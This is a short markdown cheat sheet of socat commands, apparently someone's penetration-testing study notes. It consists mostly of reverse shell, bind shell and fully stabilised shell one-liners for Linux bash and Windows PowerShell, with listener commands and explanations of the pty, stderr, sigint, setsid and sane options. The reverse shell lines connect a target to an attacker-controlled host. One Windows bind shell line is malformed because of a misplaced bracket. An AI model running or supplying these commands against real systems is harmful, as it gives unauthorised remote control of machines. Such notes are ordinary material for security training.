# Basics
In general socat just connects two point. E.g. a listener and std-in.

# Shells
## Reverse shells
**Listeners** \
`socat TCP-L:<port> -` equivalent to `nc -lvnp <port>` \

**Reverse Shell** \
Windows: \
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` \
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output. \

Linux: \
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind shells
**Linux**
`socat TCP-L:<PORT> EXEC:"bash -li"`
**Windows**
`socat TCP-L:<PORT EXEC:powershell.exe,pipes>` - We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

## Fully stable linux shell
Socat must be installed on linux target. \
``socat TCP-L:<port> FILE:`tty`,raw,echo=0`` - fully stable Linux reverse shell \
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` - execute this command on target.
- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.
